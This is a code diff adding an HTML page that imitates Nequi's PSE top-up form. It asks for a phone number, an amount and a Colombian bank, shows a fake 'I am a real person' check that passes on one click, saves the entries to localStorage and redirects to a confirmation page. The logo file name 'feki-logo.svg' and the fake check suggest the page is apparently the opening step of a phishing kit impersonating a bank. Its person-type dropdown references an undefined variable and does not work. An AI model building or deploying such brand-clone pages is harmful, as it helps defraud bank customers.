@@ -1,0 +1,474 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Recarga PSE Nequi</title>
+  <link rel="icon" type="image/png" href="nequi-favicon-dark.svg">
+  <link href="https://fonts.googleapis.com/css2?family=Manrope:wght@300;400;500;600;700;800&display=swap" rel="stylesheet"/>
+  <style>
+    :root {
+      --font-family: "Manrope", sans-serif;
+      --form-field: #f8f1f5;
+      --uva: #200020;
+      --uva-60: #796679;
+      --orquidea: #da0081;
+      --orquidea-30: #f1bfda;
+      --positive: #11da7a;
+      --negro: #000000;
+      --white: #ffffff;
+    }
+
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    html, body {
+      min-height: 100%;
+      font-family: var(--font-family);
+      -webkit-font-smoothing: antialiased;
+      background: var(--white);
+      color: var(--negro);
+      line-height: 1.5;
+    }
+
+    body {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 56px 24px;
+    }
+
+    .logo-wrap { margin-bottom: 24px; }
+    .logo-wrap img { width: 104px; height: 32px; display: block; }
+
+    h1 {
+      font-weight: 700;
+      font-size: 1.5rem;
+      line-height: 2rem;
+      text-align: center;
+      color: var(--uva);
+      margin-bottom: 1rem;
+    }
+
+    .form-wrap {
+      width: 100%;
+      max-width: 327px;
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+    }
+
+    /* ── Campos de texto ── */
+    .field { position: relative; width: 100%; }
+    .field input {
+      width: 100%;
+      height: 48px;
+      background-color: var(--form-field);
+      border: 0;
+      border-radius: 4px;
+      padding: 20px 16px 6px;
+      color: var(--uva);
+      font-family: var(--font-family);
+      font-size: 1rem;
+      font-weight: 500;
+      outline: none;
+      -webkit-text-fill-color: var(--uva);
+    }
+    .field input::-webkit-outer-spin-button,
+    .field input::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
+    .field input[type=number] { -moz-appearance: textfield; }
+
+    .field label {
+      position: absolute;
+      left: 16px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: var(--uva);
+      font-size: 1rem;
+      font-weight: 500;
+      transition: all 0.2s ease;
+      pointer-events: none;
+    }
+    .field input:focus + label,
+    .field input:not(:placeholder-shown) + label {
+      top: 6px;
+      transform: none;
+      font-size: 0.68rem;
+      font-weight: 700;
+      color: var(--orquidea);
+    }
+
+    /* ── Estilos compartidos para ambos dropdowns ── */
+    .dropdown-wrap { position: relative; cursor: pointer; width: 100%; }
+
+    .dropdown-box {
+      height: 48px;
+      background: var(--form-field);
+      border-radius: 4px;
+      border: 1.5px solid transparent;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      padding: 0 40px 0 16px;
+      transition: border-color 0.15s, background-color 0.15s;
+      user-select: none;
+    }
+    .dropdown-wrap.open .dropdown-box {
+      border-color: var(--orquidea);
+      background: var(--white);
+    }
+
+    .dropdown-box .dd-lbl {
+      font-size: 0.68rem;
+      font-weight: 700;
+      color: var(--orquidea);
+      line-height: 1.2;
+    }
+    .dropdown-box .dd-val {
+      font-size: 1rem;
+      font-weight: 500;
+      color: var(--uva);
+      line-height: 1.2;
+    }
+
+    /* Flecha — rota al abrir */
+    .dropdown-wrap::after {
+      content: "";
+      position: absolute;
+      right: 16px;
+      top: 50%;
+      transform: translateY(-50%);
+      width: 10px;
+      height: 6px;
+      background: var(--uva-60);
+      clip-path: polygon(0 0, 100% 0, 50% 100%);
+      pointer-events: none;
+      transition: transform 0.2s, background-color 0.2s;
+    }
+    .dropdown-wrap.open::after {
+      transform: translateY(-50%) rotate(180deg);
+      background: var(--orquidea);
+    }
+
+    /* Panel dropdown — igual al de bancos */
+    .dropdown-panel {
+      position: absolute;
+      top: 54px;
+      left: 0;
+      width: 100%;
+      background: #fff;
+      border-radius: 6px;
+      box-shadow: 0 2px 12px rgba(0,0,0,0.10);
+      overflow: hidden;
+      display: none;
+      z-index: 1000;
+      animation: fadeIn .15s ease;
+    }
+    .dropdown-panel.open { display: block; }
+
+    .dropdown-list {
+      max-height: 265px;
+      overflow-y: auto;
+    }
+    .dropdown-list::-webkit-scrollbar { width: 6px; }
+    .dropdown-list::-webkit-scrollbar-thumb {
+      background: #c2c2c2;
+      border-radius: 10px;
+    }
+
+    .dropdown-item {
+      padding: 14px 16px;
+      cursor: pointer;
+      font-weight: 500;
+      color: var(--uva);
+      font-size: 1rem;
+    }
+    .dropdown-item:hover { background: #f8f1f5; }
+    .dropdown-item.active { background: #ede8ed; }
+
+    /* Bancos en mayúsculas */
+    .banco-wrap .dropdown-item { font-weight: 600; text-transform: uppercase; }
+
+    .dropdown-header {
+      padding: 12px 16px;
+      font-size: 0.85rem;
+      color: var(--uva-60);
+      background: #f4f0f4;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(-4px); }
+      to   { opacity: 1; transform: translateY(0); }
+    }
+
+    /* ── Mosparo ── */
+    .mosparo-box {
+      background: var(--white);
+      border: 2px solid var(--orquidea-30);
+      border-radius: 11px;
+      display: flex;
+      align-items: center;
+      padding: 20px 24px;
+      gap: 12px;
+      cursor: pointer;
+    }
+    .mosparo-circle {
+      width: 40px; height: 40px;
+      border: 3px solid var(--orquidea);
+      border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+      flex: 0 0 40px;
+      position: relative;
+      transition: 0.25s;
+    }
+    .mosparo-circle::before {
+      content: "";
+      position: absolute;
+      inset: -3px;
+      width: 40px; height: 40px;
+      border: 1px solid var(--orquidea);
+      border-radius: 50%;
+      opacity: 0;
+      animation: ping 3s infinite;
+    }
+    @keyframes ping {
+      0%   { transform: scale(1); opacity: 0; }
+      50%  { opacity: 0.5; }
+      100% { transform: scale(1.8); opacity: 0; }
+    }
+    .mosparo-box.checked .mosparo-circle::before { display: none; }
+    .checkmark {
+      display: none;
+      width: 14px; height: 8px;
+      border-left: 3px solid var(--positive);
+      border-bottom: 3px solid var(--positive);
+      transform: rotate(-45deg);
+      margin-top: -3px;
+    }
+    .mosparo-box.checked { border-color: var(--positive); }
+    .mosparo-box.checked .mosparo-circle { border-color: var(--positive); }
+    .mosparo-box.checked .checkmark { display: block; }
+    .mosparo-lbl { color: var(--uva); font-weight: 400; font-size: 1rem; line-height: 1.4; }
+
+    /* ── Botón ── */
+    .disclaimer { font-size: 0.8rem; color: var(--uva-60); text-align: center; margin: 10px 0; }
+    .btn-continuar {
+      height: 48px;
+      background: var(--orquidea-30);
+      color: #fff;
+      border: none;
+      border-radius: 8px;
+      font-size: 1rem;
+      font-weight: 700;
+      cursor: not-allowed;
+      transition: background 0.3s;
+      width: 100%;
+      font-family: var(--font-family);
+    }
+    .btn-continuar.active { background: var(--orquidea); cursor: pointer; }
+  </style>
+</head>
+<body>
+
+  <div class="logo-wrap"><img src="feki-logo.svg" alt="Logo"></div>
+  <h1>Recarga tu Nequi</h1>
+
+  <div class="form-wrap">
+
+    <div class="field">
+      <input type="tel" id="cel1" placeholder=" " maxlength="10" oninput="update()">
+      <label>Número de celular</label>
+    </div>
+    <div class="field">
+      <input type="tel" id="cel2" placeholder=" " maxlength="10" oninput="update()">
+      <label>Confirma el número de celular</label>
+    </div>
+    <div class="field">
+      <input type="text" id="monto" placeholder=" " oninput="formatMonto(this)">
+      <label>¿Cuánto?</label>
+    </div>
+
+    <!-- Tipo de persona — mismo estilo dropdown -->
+    <div class="dropdown-wrap tipo-wrap" id="tipoWrap" onclick="toggleDropdown('tipoWrap', 'tipoPanel')">
+      <div class="dropdown-box">
+        <span class="dd-lbl">Tipo de persona</span>
+        <span class="dd-val" id="tipoVal">Natural</span>
+      </div>
+      <div class="dropdown-panel" id="tipoPanel">
+        <div class="dropdown-list" id="tipoList"></div>
+      </div>
+    </div>
+
+    <!-- Banco -->
+    <div class="dropdown-wrap banco-wrap" id="bancoWrap" onclick="toggleDropdown('bancoWrap', 'bancoPanel')">
+      <div class="dropdown-box" id="bancoBox">
+        <span class="dd-lbl">Elige el banco</span>
+        <span class="dd-val" id="bancoVal">Elige el banco</span>
+      </div>
+      <div class="dropdown-panel" id="bancoPanel">
+        <div class="dropdown-header">A continuación seleccione su banco</div>
+        <div class="dropdown-list" id="bankList"></div>
+      </div>
+    </div>
+
+    <div class="mosparo-box" id="mosparoBox" onclick="activarMosparo()">
+      <div class="mosparo-circle"><div class="checkmark"></div></div>
+      <div class="mosparo-lbl">Confirmo que soy una persona real.</div>
+    </div>
+
+    <p class="disclaimer">La recarga se hará usando los servicios de PSE y se debitará de tu cuenta corriente o de ahorros.</p>
+    <button class="btn-continuar" id="btnContinuar">Continuar</button>
+  </div>
+
+<script>
+  const bancos = [
+  "ACCION FIDUCIARIA",
+  "ALIANZA FIDUCIARIA",
+  "BAN100",
+  "BANCAMIA S.A.",
+  "BANCO AGRARIO",
+  "BANCO AV VILLAS",
+  "BANCO BBVA COLOMBIA S.A.",
+  "BANCO CAJA SOCIAL",
+  "BANCO COOPERATIVO COOPCENTRAL",
+  "BANCO DAVIVIENDA",
+  "BANCO DE BOGOTA",
+  "BANCO DE OCCIDENTE",
+  "BANCO FALABELLA",
+  "BANCO FINANDINA S.A. BIC",
+  "BANCO GNB SUDAMERIS",
+  "BANCO ITAU",
+  "BANCO J.P. MORGAN COLOMBIA S.A.",
+  "BANCO MUNDO MUJER S.A.",
+  "BANCO PICHINCHA S.A.",
+  "BANCO POPULAR",
+  "BANCO SANTANDER COLOMBIA",
+  "BANCO SERFINANZA",
+  "BANCO UNION",
+  "BANCOLOMBIA",
+  "BANCOOMEVA S.A.",
+  "BOLD CF",
+  "CFA COOPERATIVA FINANCIERA",
+  "CITIBANK",
+  "COINK SA",
+  "COLTEFINANCIERA",
+  "CONFIAR COOPERATIVA FINANCIERA",
+  "COTRAFA",
+  "CREZCAMOS MOSI",
+  "DALE",
+  "DAVIbank S.A.",
+  "DAVIPLATA",
+  "DING",
+  "FINANCIERA JURISCOOP SA COMPAÑÍA DE FINANCIAMIENTO",
+  "GLOBAL66",
+  "IRIS",
+  "JFK COOPERATIVA FINANCIERA",
+  "LULO BANK",
+  "MOVII S.A.",
+  "NU",
+  "PAYCASH",
+  "POWWI",
+  "RAPPIPAY",
+  "UALÁ"
+];
+  let bancoSel = '', tipoSel = 'Natural', verificado = false;
+
+  /* ── Dropdown genérico ── */
+  function toggleDropdown(wrapId, panelId) {
+    const wrap  = document.getElementById(wrapId);
+    const panel = document.getElementById(panelId);
+    const isOpen = wrap.classList.contains('open');
+
+    // Cerrar todos primero
+    document.querySelectorAll('.dropdown-wrap').forEach(w => w.classList.remove('open'));
+    document.querySelectorAll('.dropdown-panel').forEach(p => p.classList.remove('open'));
+
+    if (!isOpen) {
+      wrap.classList.add('open');
+      panel.classList.add('open');
+      // Renderizar según cuál se abre
+      if (wrapId === 'bancoWrap') renderBancos();
+      if (wrapId === 'tipoWrap')  renderTipos();
+    }
+  }
+
+  function renderTipos() {
+    const list = document.getElementById('tipoList');
+    list.innerHTML = '';
+    tiposPersona.forEach(t => {
+      const item = document.createElement('div');
+      item.className = 'dropdown-item' + (t === tipoSel ? ' active' : '');
+      item.textContent = t;
+      item.onclick = (e) => {
+        e.stopPropagation();
+        tipoSel = t;
+        document.getElementById('tipoVal').textContent = t;
+        document.getElementById('tipoWrap').classList.remove('open');
+        document.getElementById('tipoPanel').classList.remove('open');
+      };
+      list.appendChild(item);
+    });
+  }
+
+  function renderBancos() {
+    const list = document.getElementById('bankList');
+    list.innerHTML = '';
+    bancos.forEach(b => {
+      const item = document.createElement('div');
+      item.className = 'dropdown-item' + (b === bancoSel ? ' active' : '');
+      item.textContent = b;
+      item.onclick = (e) => {
+        e.stopPropagation();
+        bancoSel = b;
+        document.getElementById('bancoVal').textContent = b;
+        document.getElementById('bancoWrap').classList.remove('open');
+        document.getElementById('bancoPanel').classList.remove('open');
+        update();
+      };
+      list.appendChild(item);
+    });
+  }
+
+  /* Cerrar al hacer click fuera */
+  document.addEventListener('click', (e) => {
+    if (!e.target.closest('.dropdown-wrap')) {
+      document.querySelectorAll('.dropdown-wrap').forEach(w => w.classList.remove('open'));
+      document.querySelectorAll('.dropdown-panel').forEach(p => p.classList.remove('open'));
+    }
+  });
+
+  /* ── Resto ── */
+  function formatMonto(input) {
+    let v = input.value.replace(/\D/g, "");
+    input.value = v ? "$" + new Intl.NumberFormat('es-CO').format(v) : "";
+    update();
+  }
+
+  function activarMosparo() {
+    if (verificado) return;
+    document.getElementById('mosparoBox').classList.add('checked');
+    verificado = true;
+    update();
+  }
+
+  function update() {
+    const c1 = document.getElementById('cel1').value;
+    const c2 = document.getElementById('cel2').value;
+    const m  = document.getElementById('monto').value.replace(/\D/g, "");
+    const ok = c1.length === 10 && c1 === c2 && parseInt(m) >= 1000 && bancoSel && verificado;
+    const btn = document.getElementById('btnContinuar');
+    btn.classList.toggle('active', ok);
+    btn.onclick = ok ? guardarYEnviar : null;
+  }
+
+  function guardarYEnviar() {
+    const data = {
+      phoneNumber:      document.getElementById('cel1').value,
+      transactionValue: document.getElementById('monto').value,
+      bankText:         bancoSel.trim()
+    };
+    localStorage.setItem('formData', JSON.stringify(data));
+    window.location.href = "confirmacion.html";
+  }
+</script>
+</body>
+</html>
